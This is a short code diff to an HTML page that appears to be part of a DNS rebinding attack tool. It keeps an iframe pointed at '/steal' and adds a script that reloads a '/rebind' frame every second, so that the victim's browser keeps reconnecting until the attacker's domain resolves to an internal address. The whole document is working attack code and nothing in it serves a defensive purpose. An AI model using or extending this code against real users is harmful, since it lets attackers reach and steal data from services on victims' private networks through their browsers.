@@ -1,2 +1,8 @@
 <iframe src="/steal"></iframe>
-<iframe src="/rebind"></iframe>
+<iframe id=rebind src="/rebind"></iframe>
+<script>
+//We're gonna be refreshing the page ever second for the case where the browser makes a connection back to our server before it is terminated
+setInterval(()=>{
+    frames[1].location.href="{location}"
+}, 1000)
+</script>
